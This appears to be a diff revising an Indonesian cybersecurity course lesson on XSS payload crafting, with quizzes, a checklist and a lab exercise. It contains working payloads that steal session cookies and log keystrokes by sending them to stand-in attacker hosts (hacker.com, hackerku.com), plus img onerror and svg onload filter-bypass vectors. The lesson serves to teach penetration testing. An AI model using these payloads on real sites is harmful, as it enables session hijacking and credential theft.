@@ -10,9 +10,9 @@
 
 Setelah menyelesaikan materi hari ini, kamu akan mampu:
 
-1. **Merakit** payload skrip injeksi peretasan parameter *XSS* tingkat mahir (*Payload Crafting*).
-2. **Mengeksploitasi** penyimpanan sesi peramban *Cookie* sasaran untuk diekstraksi dan dirampas utuh.
-3. **Mensimulasikan** delegasi peretasan arsitektur penyadapan pelaporan tombol papan ketik peramban pengguna target (*Keylogging*).
+1. **Merakit** kode *JavaScript* khusus untuk eksploitasi tingkat lanjut (*Payload Crafting*).
+2. **Mengeksploitasi** dan mencuri *Session Cookie* milik pengguna lain.
+3. **Mensimulasikan** skrip penyadapan tombol papan ketik (*Keylogging*) menggunakan XSS.
 
 ---
 
@@ -20,45 +20,51 @@ Setelah menyelesaikan materi hari ini, kamu akan mampu:
 
 ### Seni Meracik Payload XSS (Payload Crafting)
 
-Pada modul *Forge Rank* (Minggu 14), Anda telah meninjau konsep *XSS (Cross-Site Scripting)* sebagai kerentanan arsitektur aplikasi web di mana peladen secara fatal lalai memvalidasi lantas eksekusi kodingan *JavaScript* modifikasi penganalisis (sebagai contoh pop-up layar `alert(1)`). 
+Pada Rank *Forge* (Minggu 14), kamu telah mempelajari konsep dasar *XSS (Cross-Site Scripting)*, yaitu celah keamanan di mana aplikasi web mengeksekusi kode *JavaScript* berbahaya yang disisipkan oleh penyerang (biasanya didemonstrasikan dengan *pop-up* peringatan `alert(1)`).
 
-Bagi spesialis penganalisis industri di jenjang kompetensi *Breach Rank*, mencetak ekskavasi Pop-up peringatan tersebut merupakan eksploitasi parameter evaluasi awal semata. Jika spesialis arsitektur telah berhasil mengeksploitasi *Browser* pengguna sasaran untuk menelan lantas mengeksekusi parameter instruksional *JavaScript*, maka tahapan eskalasi berikutnya adalah: peramban tersebut untuk meretas dan menyerahkan arsip parameter kredensial informasinya secara komprehensif! Skrip peretasan terstruktur yang diracik spesifik ini didefinisikan secara nomenklatur taktis sebagai arsitektur **Payload**.
+Bagi *Pentester* di tingkat *Breach Rank*, memunculkan *pop-up* tersebut barulah langkah awal (*Proof of Concept*). Jika kita sudah berhasil memaksa *browser* korban mengeksekusi kode *JavaScript*, langkah selanjutnya adalah membuat kode tersebut melakukan tindakan berbahaya secara otomatis! Skrip *JavaScript* yang dirancang khusus untuk mencuri data atau mengeksploitasi korban ini disebut sebagai **Payload**.
 
-### 1. Merampas Identitas Sesi Otentik (Cookie Stealing)
+### 1. Merampas Sesi Otentikasi (Cookie Stealing)
 
-kalung otentikasi sesi *Session Cookie* merupakan sandi otorisasi esensial hak kendali Admin. Jika entitas Administrator peladen menyimpan kalung sesi otentikasi komputasinya dalam antarmuka *Cookie* yang rentan lantaran tidak dikonfigurasi proteksi pelindungan atribut bendera sandi *HttpOnly*, penganalisis penyerang dapat mengekstraksinya!
+*Session Cookie* berfungsi sebagai tiket identitas *login*. Jika *Cookie* seorang Administrator berhasil dicuri, penyerang bisa mengambil alih akun Admin tersebut tanpa perlu mengetahui kata sandinya! Hal ini sangat rentan terjadi jika pengembang web tidak mengamankan *Cookie* dengan *flag* `HttpOnly`.
 
-Asumsikan agen penganalisis (*Hacker*) mengoperasikan peladen sasaran eksternal penampung beridentitas `hacker.com/curi`.
-Peretas menyusupkan skrip modifikasi arsitektur *XSS Stored* di kolom Komentar target:
-```html
-<script>
- // peramban ekstraksi cookie lantas mentransmisikannya ke server penadah
- fetch('http://hacker.com/curi?kuki=' + document.cookie);
-</script>
-```
-Ketika Administrator sasaran membaca komentar tersebut, arsitektur *Browser* si Admin secara otomatis perintah eksekusi menyedot fungsi parameter *Cookie* otentik Admin, lantas peramban mentransmisikan sandi tersebut menyeberang ke peladen penadah milik *Hacker* secara sunyi tanpa disadari penggunanya sedikit pun!
-
-### 2. Mengekskavasi Rekaman Tombol Papan Ketik (XSS Keylogging)
-
-Bagaimana jika arsitektur peladen mencegah pelaporan ekstraksi *Cookie* secara spesifik (misal via WAF)? Tahapan taktis modifikasi eksploitasinya: Spesialis penganalisis pembajakan parameter masukan interaksi *Keyboard* peramban penggunanya!
-Peretas meracik *Payload* penyadap arsitektur ketikan (*Keylogger*):
+Asumsikan penyerang (*Hacker*) memiliki server penampung data di `hacker.com/curi`.
+Penyerang menyusupkan *Payload XSS* ini ke dalam kolom Komentar di situs korban:
 
 ```html
 <script>
- // Merekam setiap eksekusi tuts ketikan peramban di layar
- document.addEventListener('keypress', function(e) {
- fetch('http://hacker.com/curi_huruf?ketik=' + e.key);
- });
+  // Mengambil cookie korban lalu mengirimkannya ke server penyerang
+  fetch('http://hacker.com/curi?kuki=' + document.cookie);
 </script>
 ```
-Terhitung sejak detik skrip tersebut dieksekusi peladen korban, setiap kali sasaran Administrator mengoperasikan pengetikan sandi rahasia atau pelaporan pesan di layar antarmukanya, huruf demi huruf tersebut akan diterbangkan terkirim diam-diam secara ke infrastruktur server Hacker penyerang. Inilah ekskavasi arsitektur fatal *XSS* mutakhir! 
+
+Ketika Administrator membaca komentar tersebut, *browser* sang Admin akan secara otomatis mengeksekusi skrip tersebut, menyedot *Cookie*-nya sendiri, lalu mengirimkannya ke server penyerang di belakang layar secara diam-diam!
+
+### 2. Penyadapan Pengetikan (XSS Keylogging)
+
+Bagaimana jika keamanan server target memblokir ekstraksi *Cookie*? Penyerang bisa mengubah strateginya menjadi: menyadap semua yang diketik oleh korban (*Keylogger*)!
+
+Penyerang meracik *Payload Keylogger* menggunakan XSS:
+
+```html
+<script>
+  // Merekam setiap tombol yang ditekan korban di halaman web tersebut
+  document.addEventListener('keypress', function(e) {
+    fetch('http://hacker.com/curi_huruf?ketik=' + e.key);
+  });
+</script>
+```
+
+Begitu skrip ini dimuat, setiap kali Administrator mengetikkan sesuatu (misalnya kata sandi, pesan rahasia, atau nomor kartu kredit) di halaman tersebut, huruf demi huruf yang diketik akan langsung terkirim ke server penyerang. Ini adalah salah satu dampak paling fatal dari kerentanan XSS.
 
 ### Merobek Perisai Penapisan WAF (WAF Bypass)
 
-Terkadang infrastruktur *Firewall (WAF)* peladen memblokir fungsi pengetikan eksplisit deklarasi tag `<script>`. Agen penyerang mengadaptasi taktis dengan meracik injeksi *Payload* tanpa melibatkan tag *script*, yakni mengimplementasikan manipulasi pelaporan kerentanan pemancing *event handler* di atribut tag *HTML* lain, semisal ekskavasi Tag Gambar arsitektur atau sandi SVG:
+Terkadang, sistem pertahanan web (*Web Application Firewall / WAF*) sudah cukup pintar untuk mendeteksi dan memblokir tag `<script>`. Untuk mengakalinya, penyerang menyisipkan *JavaScript* menggunakan atribut *event handler* dari tag HTML biasa, seperti tag gambar (`<img>`) atau vektor grafis (`<svg>`):
+
 - `<img src="x" onerror="alert(document.cookie)">` 
- *(Representasi logika : Perintahkan peramban memanggil gambar bernilai 'x'. Ketika pencarian gambar itu gagal (error), maka peramban lantas diperintahkan mengeksekusi komando alert XSS di sebelah fungsinya!)*
+  *(Logika: Perintahkan browser memuat gambar palsu "x". Saat pemuatan gambar itu gagal/error, eksekusi perintah JavaScript di dalam `onerror`!)*
 - `<svg onload=alert(1)>`
+  *(Logika: Saat elemen grafis SVG selesai dimuat, eksekusi JavaScript).*
 
 ---
 
@@ -66,58 +72,58 @@ Terkadang infrastruktur *Firewall (WAF)* peladen memblokir fungsi pengetikan eks
 
 **Durasi**: ~10 menit
 
-Mari menyimulasikan penyusunan peretasan penyedot parameter sesi (*Cookie Stealing*)!
+Mari menyimulasikan penyusunan *Payload* penyedot *Cookie*!
 
-1. Kunjungi pelataran laboratorium eksekusi *PortSwigger XSS Labs*.
-2. Asumsikan Anda ditugaskan klien menguji penetrasi dengan menyeludupkan *Stored XSS* di antarmuka forum komentar situs.
-3. Aplikasi web sasaran ternyata memasang arsitektur pemblokir anti-script sasaran (`<script>` diharamkan secara).
-4. Anda lantas memodifikasi peracikan *Payload* kamuflase memanfaatkan taktis *error* tag gambar:
- `<img src="salah" onerror="document.location='http://hackerku.com/curi?kuki='+document.cookie">`
-5. Bila kelak kelalaian tersebut diakses dan ada pengguna sasaran mampir memuat laman komentar itu, laman peramban bakal me-*redirect* paksa dirinya menyeberang ke situs milik penganalisis *hacker* sembari secara otomatis menyerahkan pengikatan otorisasi *Cookie*-nya yang dimuat di buntut *URL*.
+1. Kunjungi ekosistem *PortSwigger XSS Labs*.
+2. Asumsikan kamu sedang menguji celah *Stored XSS* di halaman komentar situs.
+3. Aplikasi target ternyata menggunakan sistem filter (*WAF*) yang memblokir tag `<script>`.
+4. Rakitlah sebuah *Payload* alternatif memanfaatkan fungsi `onerror` pada tag gambar:
+  `<img src="salah" onerror="document.location='http://hackerku.com/curi?kuki='+document.cookie">`
+5. Ketika Administrator memuat laman komentar tersebut, *browser*-nya akan mencari gambar "salah". Karena gambar tersebut tidak ada, fitur `onerror` akan aktif dan memaksa *browser* Administrator beralih halaman (*redirect*) ke situs penyerang sambil mengirimkan *Cookie*-nya melalui URL.
 
 ---
 
 ## 💡 Quiz Kilat
 
 <details>
-<summary>❓ Membedah konseptual peretasan <i>XSS</i> yang acap diremehkan sekadar selumrah insiden kerentanan pop-up belaka, skrip eksploitasi jenis apakah (yang digariskan bertugas merampas kalung identitas login) yang didapuk laksana metode eksekusi senjata peretasan paling umum dari pengerahan payung <i>XSS</i> ?</summary>
+<summary>❓ Meskipun pop-up <code>alert(1)</code> populer untuk membuktikan kerentanan XSS, apa bentuk eksploitasi serangan nyata (yang berbahaya) yang paling sering dilakukan menggunakan XSS?</summary>
 
-**Jawaban:** Pencurian Sandi otentikasi Sesi Login (Cookie Stealing via eksploitasi manipulasi sandi `document.cookie`).
+**Jawaban:** Pencurian identitas Sesi Login / Pencurian *Cookie* (*Cookie Stealing*).
 </details>
 
 <details>
-<summary>❓ Ketika spesialis peretas meluncurkan serangan eksploitasi <i>XSS Keylogging</i>, tipe pelaporan peristiwa peramban (Event) <i>JavaScript</i> apakah yang acap didikte lantas direnggut peretas guna menyadap pelaporan ketikan pengguna?</summary>
+<summary>❓ Pada eksploitasi <i>XSS Keylogging</i>, fitur <i>JavaScript</i> apa yang dimanfaatkan oleh penyerang untuk menyadap setiap ketikan pengguna di layar?</summary>
 
-**Jawaban:** Pengawasan *Event* pendeteksi hentakan tombol (semacam penerapan *event listener* `keypress`, fungsi `keyup`, maupun operasi `keydown`).
+**Jawaban:** Fitur pendeteksi *Event Listener* pada *Keyboard*, seperti `keypress`, `keyup`, atau `keydown`.
 </details>
 
 <details>
-<summary>❓ Jikalau arsitektur perisai <i>WAF (Web Application Firewall)</i> mengutuk dan secara memblokir pengetikan atribut tag `<script>`, bagaimana siasat penganalisis <i>Hacker</i> meretas bongkahan peramban <i>XSS</i> agar menyusup murni tanpa menggunakan tag keramat tersebut?</summary>
+<summary>❓ Jika WAF target langsung memblokir semua input yang mengandung tag <code>&lt;script&gt;</code>, taktik *bypass* apa yang digunakan penyerang untuk tetap bisa mengeksekusi *JavaScript*?</summary>
 
-**Jawaban:** Mengeksploitasi pemancing *Event Handlers* yang menempel pada ekstensi atribut tag HTML lain. Contoh pengerahan paling masyhur adalah mengeksploitasi muatan *error* tag pemuatan gambar: `<img src="salah" onerror="alert(1)">` atau tag vektor grafis `<svg onload="alert(1)">`.
+**Jawaban:** Penyerang menyisipkan *JavaScript* ke dalam *Event Handler* dari tag HTML lain (seperti tag `<img onerror=...>` atau `<svg onload=...>`).
 </details>
 
 ---
 
 ## 📋 Checklist Hari Ini
 
-- [ ] Saya menyerap diferensiasi esensi taktis peramban `alert(1)` dibandingkan modifikasi racikan fungsi *Payload Crafting* sejati
-- [ ] Saya fasih menjabarkan arsitektur logika eksploitasi curian otentikasi *Cookie Stealing*
-- [ ] Saya menguasai mekanisme instruksional penjebol WAF bermodalkan pemancing parameter `<img onerror=>`
-- [ ] Saya telah menamatkan pemahaman konsep penyadapan via peramban *Keylogger XSS*
-- [ ] Saya telah menjawab evaluasi seluruh *quiz kilat*
+- [ ] Saya memahami perbedaan antara *Proof of Concept* sederhana (`alert(1)`) dan *Payload Crafting*.
+- [ ] Saya mengerti cara kerja *Payload* pencurian *Cookie*.
+- [ ] Saya memahami konsep penyadapan tombol menggunakan *XSS Keylogger*.
+- [ ] Saya menguasai taktik *bypass* WAF menggunakan tag `<img onerror=>`.
+- [ ] Saya telah menjawab evaluasi seluruh *Quiz Kilat* dengan tepat.
 
 ---
 
 ## 🔗 Resources
 
-- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) — Kumpulan kompilasi repositori perumusan racikan kamus *Payload* peretasan *XSS* sedunia.
+- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) — Repositori populer yang berisi ratusan referensi *Payload* XSS untuk *bypass* WAF.
 
 ---
 
 ## ➡️ Besok
 
-**Day 2: CSRF & SSRF** — Kalau arsitektur *XSS* mengeksploitasi dengan meracuni peramban sasar, besok hari Anda bakal mengadopsi simulasi untuk mengendalikan serta menyetir *Browser* sasaran tanpa disadari secara oleh korbannya sendiri. Bersiaplah mengkaji taktis peramban **CSRF (Cross-Site Request Forgery)**, yakni metode peramban yang secara sanggup memaksa arsitektur peramban Admin *Mentransfer Uang Rekeningnya ke Rekening Hacker *, selagi Admin sasaran menyangka perambannya semata-mata tengah mengklik laman gambar kucing lucu!
+**Day 2: CSRF & SSRF** — Kalau serangan *XSS* menyisipkan *JavaScript* untuk mencuri data dari *browser* korban, esok hari kamu akan mempelajari trik untuk **mengendalikan** tindakan korban! Melalui kerentanan **CSRF (Cross-Site Request Forgery)**, kamu bisa memaksa *browser* korban (yang sedang *login*) untuk mengubah kata sandinya sendiri atau bahkan mentransfer uang, tanpa korban sadari. Bersiaplah mengeksploitasi sisi pengguna web di tingkat selanjutnya!
 
 ---
 
